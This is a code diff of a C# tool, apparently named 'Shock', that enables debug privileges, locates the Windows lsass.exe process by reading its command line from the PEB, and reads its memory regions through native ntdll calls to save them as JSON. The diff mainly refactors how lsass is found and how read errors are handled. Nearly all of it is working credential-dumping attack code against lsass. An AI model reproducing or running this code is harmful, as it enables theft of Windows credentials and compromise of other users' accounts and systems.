@@ -1,92 +1,61 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Diagnostics;
 using System.Linq;
-using System.Net.NetworkInformation;
+using System.Diagnostics;
+using System.Collections.Generic;
 using System.Runtime.InteropServices;
-using System.Text;
 using static Shock.NT;
 
 
 namespace Shock
 {
-    public class ModuleInformation
-    {
-        public string Name { get; set; }
-        public string FullPath { get; set; }
-        public IntPtr Address { get; set; }
-        public int Size { get; set; }
-
-        public ModuleInformation(string name, string fullpath, IntPtr address, int size)
-        {
-            Name = name;
-            FullPath = fullpath;
-            Address = address;
-            Size = size;
-        }
-    }
-
-
     internal class Program
     {
-        [StructLayout(LayoutKind.Sequential)]
-        public struct LUID
-        {
-            public uint LowPart;
-            public int HighPart;
-        }
-
-
-        [StructLayout(LayoutKind.Sequential)]
-        public struct TOKEN_PRIVILEGES
-        {
-            public uint PrivilegeCount;
-            public LUID Luid;
-            public uint Attributes;
-        }
-
-
-        [StructLayout(LayoutKind.Sequential)]
-        public struct MEMORY_BASIC_INFORMATION
-        {
-            public IntPtr BaseAddress;
-            public IntPtr AllocationBase;
-            public int AllocationProtect;
-            public IntPtr RegionSize;
-            public int State;
-            public int Protect;
-            public int Type;
-        }
-
-
-        [DllImport("ntdll.dll")]
-        public static extern uint NtOpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, ref IntPtr TokenHandle);
-
-        [DllImport("ntdll.dll")]
-        public static extern uint NtAdjustPrivilegesToken(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);
-
-        [DllImport("ntdll.dll")]
-        public static extern uint NtClose(IntPtr hObject);
-
-        [DllImport("ntdll.dll", SetLastError = true)]
-        public static extern uint NtQueryInformationProcess(IntPtr processHandle, int processInformationClass, IntPtr pbi, uint processInformationLength, out uint returnLength);
-
-        [DllImport("ntdll.dll")]
-        public static extern uint NtReadVirtualMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
-
-        [DllImport("ntdll.dll")]
-        public static extern uint NtQueryVirtualMemory(IntPtr hProcess, IntPtr lpAddress, uint MemoryInformationClass, out MEMORY_BASIC_INFORMATION MemoryInformation, uint MemoryInformationLength, out uint ReturnLength);
-
-
+        // Constants
         public const uint TOKEN_ADJUST_PRIVILEGES = 0x00000020;
         public const uint TOKEN_QUERY = 0x00000008;
-        public const uint PROCESS_QUERY_INFORMATION = 0x0400;
-        public const uint PROCESS_VM_READ = 0x0010;
         public const uint MemoryBasicInformation = 0;
         public const int MEM_COMMIT = 0x00001000;
         public const int PAGE_NOACCESS = 0x01;
 
+        // Functions
+        [DllImport("ntdll.dll")] public static extern uint NtOpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, ref IntPtr TokenHandle);
 
+        [DllImport("ntdll.dll")] public static extern uint NtAdjustPrivilegesToken(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);
+
+        [DllImport("ntdll.dll")] public static extern uint NtClose(IntPtr hObject);
+
+        [DllImport("ntdll.dll")] public static extern bool NtGetNextProcess(IntPtr handle, int MAX_ALLOWED, int param3, int param4, out IntPtr outHandle);
+
+        [DllImport("ntdll.dll", SetLastError = true)] public static extern uint NtQueryInformationProcess(IntPtr processHandle, int processInformationClass, IntPtr pbi, uint processInformationLength, out uint returnLength);
+
+        [DllImport("ntdll.dll")] public static extern uint NtQueryVirtualMemory(IntPtr hProcess, IntPtr lpAddress, uint MemoryInformationClass, out MEMORY_BASIC_INFORMATION MemoryInformation, uint MemoryInformationLength, out uint ReturnLength);
+
+        [DllImport("ntdll.dll")] public static extern uint NtReadVirtualMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
+
+        // Structures
+        [StructLayout(LayoutKind.Sequential)] public struct TOKEN_PRIVILEGES { public uint PrivilegeCount; public LUID Luid; public uint Attributes; }
+
+        [StructLayout(LayoutKind.Sequential)] public struct LUID { public uint LowPart; public int HighPart; }
+
+        [StructLayout(LayoutKind.Sequential)] public struct MEMORY_BASIC_INFORMATION { public IntPtr BaseAddress; public IntPtr AllocationBase; public int AllocationProtect; public IntPtr RegionSize; public int State; public int Protect; public int Type; }
+
+        // Custom class
+        public class ModuleInformation
+        {
+            public string Name;
+            public string FullPath;
+            public IntPtr Address;
+            public int Size;
+            public ModuleInformation(string name, string fullpath, IntPtr address, int size)
+            {
+                this.Name = name;
+                this.FullPath = fullpath;
+                this.Address = address;
+                this.Size = size;
+            }
+        }
+
+        
         static void EnableDebugPrivileges()
         {
             IntPtr currentProcess = Process.GetCurrentProcess().Handle;
@@ -128,9 +97,9 @@ namespace Shock
         {
             byte[] buff = new byte[8];
             uint ntstatus = NtReadVirtualMemory(hProcess, mem_address, buff, buff.Length, out _);
-            if (ntstatus != 0)
+            if (ntstatus != 0 && ntstatus != 0xC0000005 && ntstatus != 0x8000000D && hProcess != IntPtr.Zero)
             {
-                Console.WriteLine("[-] Error calling NtReadVirtualMemory. NTSTATUS: 0x" + ntstatus.ToString("X") + " reading address 0x" + mem_address.ToString("X"));
+                Console.WriteLine("[-] Error calling NtReadVirtualMemory (ReadRemoteIntPtr). NTSTATUS: 0x" + ntstatus.ToString("X") + " reading address 0x" + mem_address.ToString("X"));
             }
             long value = BitConverter.ToInt64(buff, 0);
             return (IntPtr)value;
@@ -141,9 +110,9 @@ namespace Shock
         {
             byte[] buff = new byte[256];
             uint ntstatus = NtReadVirtualMemory(hProcess, mem_address, buff, buff.Length, out _);
-            if (ntstatus != 0 )
+            if (ntstatus != 0 && ntstatus != 0xC0000005 && ntstatus != 0x8000000D && hProcess != IntPtr.Zero)
             {
-                Console.WriteLine("[-] Error calling NtReadVirtualMemory. NTSTATUS: 0x" + ntstatus.ToString("X") + " reading address 0x" + mem_address.ToString("X"));
+                Console.WriteLine("[-] Error calling NtReadVirtualMemory (ReadRemoteWStr). NTSTATUS: 0x" + ntstatus.ToString("X") + " reading address 0x" + mem_address.ToString("X"));
             }
             string unicode_str = "";
             for (int i = 0; i < buff.Length - 1; i += 2)
@@ -245,39 +214,26 @@ namespace Shock
         }
 
 
-        public static List<IntPtr> GetProcessByName(string proc_name)
+        public static IntPtr GetProcessByName(string proc_name)
         {
             IntPtr aux_handle = IntPtr.Zero;
             int MAXIMUM_ALLOWED = 0x02000000;
-            List<IntPtr> handles_list = new List<IntPtr>();
-
+            
             while (!NtGetNextProcess(aux_handle, MAXIMUM_ALLOWED, 0, 0, out aux_handle))
             {
-                StringBuilder fileName = new StringBuilder(100);
-                GetProcessImageFileName(aux_handle, fileName, 100);
-                char[] stringArray = fileName.ToString().ToCharArray();
-                Array.Reverse(stringArray);
-                string reversedStr = new string(stringArray);
-                int index = reversedStr.IndexOf("\\");
-                if (index != -1)
-                {
-                    string res = reversedStr.Substring(0, index);
-                    stringArray = res.ToString().ToCharArray();
-                    Array.Reverse(stringArray);
-                    res = new string(stringArray);
-                    if (res == proc_name)
-                    {
-                        handles_list.Add(aux_handle);
-                    }
+                string current_proc_name = GetProcNameFromHandle(aux_handle);
+                if (current_proc_name == proc_name) {
+                    return aux_handle;
                 }
             }
-            return handles_list;
+            return IntPtr.Zero;
         }
 
 
-        unsafe static int get_pid(IntPtr process_handle) {
+        unsafe static string GetProcNameFromHandle(IntPtr process_handle) {
             uint process_basic_information_size = 48;
-            int pid_offset = 0x20;
+            int peb_offset = 0x8;
+            int commandline_offset = 0x68;
 
             // Create byte array with the size of the PROCESS_BASIC_INFORMATION structure
             byte[] pbi_byte_array = new byte[process_basic_information_size];
@@ -296,9 +252,26 @@ namespace Shock
             }
 
             // Get PEB Base Address
-            IntPtr peb_pointer = pbi_addr + pid_offset;
+            IntPtr peb_pointer = pbi_addr + peb_offset;
             IntPtr pebaddress = Marshal.ReadIntPtr(peb_pointer);
-            return (int)pebaddress;
+
+            // Get PEB->ProcessParameters
+            int processparameters_offset = 0x20;
+            IntPtr processparameters_pointer = pebaddress + processparameters_offset;
+            
+            // Get ProcessParameters->CommandLine
+            IntPtr processparameters_adress = ReadRemoteIntPtr(process_handle, processparameters_pointer);
+            IntPtr commandline_pointer = processparameters_adress + commandline_offset;
+            IntPtr commandline_address = ReadRemoteIntPtr(process_handle, commandline_pointer);
+            string commandline_value = ReadRemoteWStr(process_handle, commandline_address);
+
+            /* Console.WriteLine("pebaddress: \t\t0x" + pebaddress.ToString("X"));
+            Console.WriteLine("processparameters_pointer: \t\t0x" + processparameters_pointer.ToString("X"));
+            Console.WriteLine("processparameters_adress : \t\t0x" + processparameters_adress.ToString("X"));
+            Console.WriteLine("commandline_pointer:\t\t0x" + commandline_pointer.ToString("X"));
+            Console.WriteLine("commandline_address:\t\t0x" + commandline_address.ToString("X")); */
+
+            return commandline_value;
         }
 
 
@@ -307,8 +280,8 @@ namespace Shock
             EnableDebugPrivileges();
 
             // Get process name
-            string proc_name = "lsass.exe";
-            IntPtr processHandle = GetProcessByName(proc_name).First();
+            string proc_name = "C:\\WINDOWS\\system32\\lsass.exe";
+            IntPtr processHandle = GetProcessByName(proc_name);
             Console.WriteLine("[+] Process handle:  \t\t\t\t" + processHandle);
 
             // List to get modules information
@@ -358,6 +331,8 @@ namespace Shock
                 // Next memory region
                 mem_address = (IntPtr)((ulong)mem_address + (ulong)mbi.RegionSize);
             }
+            // Close process handle
+            NtClose(processHandle);
 
             // Generate JSON
             string[] aux_array_1 = { };
@@ -370,6 +345,7 @@ namespace Shock
             string shock_json_content = ToJsonArray(aux_array_1);
             WriteToFile(file_name, shock_json_content);
         }
+
 
         static void Main(string[] args)
         {
